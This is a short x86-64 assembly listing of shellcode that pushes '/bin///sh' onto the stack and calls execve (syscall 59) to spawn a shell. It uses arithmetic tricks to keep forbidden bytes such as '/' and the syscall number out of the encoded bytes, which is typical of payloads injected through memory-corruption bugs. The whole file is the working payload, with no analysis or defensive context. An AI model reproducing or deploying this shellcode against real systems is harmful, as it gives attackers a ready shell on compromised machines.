bits 64
    push 0x68
    mov rax, 0x732f2f2f6e696225
    add rax, 0xa
    push rax
    push rsp
    pop rdi
    xor esi, esi
    cdq

    push 49       ; push 49 and add 10 to make 59 (syscall execve)
    add [rsp], byte 0xa

    pop rax
    syscall
